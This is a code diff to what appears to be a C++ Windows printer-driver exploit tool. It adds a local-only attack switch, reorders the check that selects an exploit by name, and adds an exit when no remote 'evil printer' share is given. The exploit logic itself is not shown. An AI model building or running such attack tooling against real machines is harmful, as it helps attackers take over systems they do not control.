@@ -72,9 +72,10 @@ namespace
 		auto evil_address = op.add<popl::Value<std::string>>("r", "rhost", "The remote evil printer address");
 		auto evil_printer = op.add<popl::Value<std::string>>("n", "name", "The remote evil printer name");
 		auto exploit = op.add<popl::Value<std::string>>("e", "exploit", "The exploit to use");
+		auto local_only = op.add<popl::Switch>("l", "local", "No remote printer. Local attack only.");
 		op.parse(p_argc, p_argv);
 
-		if (p_argc == 1 || help->is_set())
+		if (p_argc < 3 || help->is_set())
 		{
 			std::cout << op << std::endl;
 			std::cout << "Exploits available:" << std::endl;
@@ -85,6 +86,28 @@ namespace
 				std::cout << "\t" << *it << std::endl;
 			}
 			return false;
+		}
+
+		if (!exploit->is_set())
+		{
+			std::cerr << "[-] Must provide an exploit." << std::endl;
+			return false;
+		}
+		else
+		{
+			if (!s_exploits.availableExploit(exploit->value(0)))
+			{
+				std::cout << "[!] User provided exploit is invalid" << std::endl;
+				return false;
+			}
+
+			p_exploit_ptr = s_exploits.createExploit(exploit->value(0));
+		}
+
+		if (local_only->is_set())
+		{
+			// try the attack without reaching out to an evil printer
+			return true;
 		}
 
 		if (!evil_address->is_set())
@@ -107,22 +130,6 @@ namespace
 		{
 			p_shared_printer.append("\\");
 			p_shared_printer.append(evil_printer->value(0));
-		}
-
-		if (!exploit->is_set())
-		{
-			std::cerr << "[-] Must provide an exploit." << std::endl;
-			return false;
-		}
-		else
-		{
-			if (!s_exploits.availableExploit(exploit->value(0)))
-			{
-				std::cout << "[!] User provided exploit is invalid" << std::endl;
-				return false;
-			}
-
-			p_exploit_ptr = s_exploits.createExploit(exploit->value(0));
 		}
 
 		return true;
@@ -158,6 +165,11 @@ int main(int p_argc, const char* p_argv[])
 	std::cout << "[+] Checking if driver is already installed" << std::endl;
 	if (installDriverFromStore(exploit_ptr->get_driver_name()) == false)
 	{
+		if (shared_printer.empty())
+		{
+			std::cout << "[!] Exiting" << std::endl;
+			return EXIT_FAILURE;
+		}
 		if (!downloadDriver(shared_printer))
 		{
 			return EXIT_FAILURE;
